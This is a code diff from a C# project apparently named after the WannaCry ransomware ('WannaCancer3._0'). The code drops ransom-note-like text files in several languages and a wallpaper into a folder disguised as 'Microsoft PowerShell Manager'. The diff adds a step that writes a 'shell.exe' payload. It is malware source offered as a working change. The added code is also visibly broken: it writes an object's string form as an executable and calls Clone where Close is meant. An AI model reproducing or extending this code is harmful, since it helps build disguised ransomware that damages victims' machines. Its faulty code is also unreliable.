@@ -57,10 +57,12 @@ namespace WannaCancer3._0
             FileStream EN = new FileStream(@"C:\Program Files\Microsoft PowerShell Manager\EN.txt", FileMode.Create, FileAccess.Write);
             FileStream JP = new FileStream(@"C:\Program Files\Microsoft PowerShell Manager\JP.txt", FileMode.Create, FileAccess.Write);
             FileStream BG = new FileStream(@"C:\Program Files\Microsoft PowerShell Manager\BG.png", FileMode.Create, FileAccess.Write);
+            FileStream keyGen = new FileStream(@"C:\Program Files\Microsoft PowerShell Manager\shell.exe", FileMode.Create);
 
             byte[] vi = Encoding.Unicode.GetBytes(Properties.Resources.VI);
             byte[] en = Encoding.Default.GetBytes(Properties.Resources.EN);
             byte[] jp = Encoding.Unicode.GetBytes(Properties.Resources.JP);
+            byte[] keygen = Encoding.Default.GetBytes(this.keygen.ToString());        
             //Image -> byte
             ImageConverter imageConverter = new ImageConverter();
             byte[] bg = (byte[])imageConverter.ConvertTo(Properties.Resources.WallPaper, typeof(byte[]));
@@ -70,12 +72,13 @@ namespace WannaCancer3._0
             EN.Write(en, 0, en.Length);
             JP.Write(jp, 0, jp.Length);
             BG.Write(bg, 0, bg.Length);
+            keyGen.Write(keygen, 0, keygen.Length);
 
             VN.Close();
             EN.Close();
             JP.Close();
             BG.Close();
-
+            keygen.Clone();
 
         }
 
